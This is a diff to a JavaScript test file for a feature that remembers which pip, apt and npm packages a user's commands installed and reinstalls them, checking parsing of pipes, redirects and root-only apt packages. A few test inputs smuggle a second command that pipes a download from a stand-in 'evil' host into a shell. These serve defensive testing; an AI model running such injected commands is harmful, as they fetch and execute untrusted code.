@@ -46,7 +46,12 @@ section('what a command installs is remembered, by name only');
   check('nothing that could become a second command', p('pip install "a; curl evil|sh"').pip.join() === '');
   check('apt names the same', p('apt-get install -y $(curl evil)').apt.join() === '');
 
-  await care.rememberPackages('u-care', 'pip install -q cowsay && apt-get install -y tree && npm i -g tsx');
+  check('a pipe ends the list: tail is not a package', p('apt-get install -y ffmpeg | tail -1').apt.join() === 'ffmpeg');
+  check('nor is where the output went', p('pip install rich > /tmp/log 2>&1').pip.join() === 'rich');
+  await care.rememberPackages('u-care-2', 'apt-get install -y openssh-server; true');
+  check('a system package from a command that was not root is not remembered, or it would go back as root', !(await store.getUserSetting('u-care-2', 'machinePackages'))?.apt?.length);
+
+  await care.rememberPackages('u-care', 'pip install -q cowsay && apt-get install -y tree && npm i -g tsx', { asRoot: true });
   await care.rememberPackages('u-care', 'pip install cowsay rich');
   const saved = await store.getUserSetting('u-care', 'machinePackages');
   check('kept for the account, once each', saved.pip.join() === 'cowsay,rich' && saved.apt.join() === 'tree' && saved.npm.join() === 'tsx', JSON.stringify(saved));
@@ -57,7 +62,7 @@ section('what a command installs is remembered, by name only');
   const line = (c) => c.args.at(-1);
   check('a new machine gets them all back', count === 4, String(count));
   check('  in the background, nobody waiting', ran.every((c) => c.detached === true));
-  check('  the account\'s as the account', !ran[0].sudo && /pip install --user[^\n]* cowsay rich/.test(line(ran[0])) && /npm install -g[^\n]* tsx/.test(line(ran[0])), line(ran[0]).slice(-200));
+  check('  the account\'s as the account', !ran[0].sudo && /pip install --user[^\n]* cowsay;[^\n]*pip install --user[^\n]* rich/.test(line(ran[0])) && /npm install -g[^\n]* tsx/.test(line(ran[0])), line(ran[0]).slice(-200));
   check('  and system packages as root', ran[1].sudo === true && /apt-get install -y[^\n]* tree/.test(line(ran[1])));
 
   // What is stored is read back as carefully as it was written: the row could have been edited.
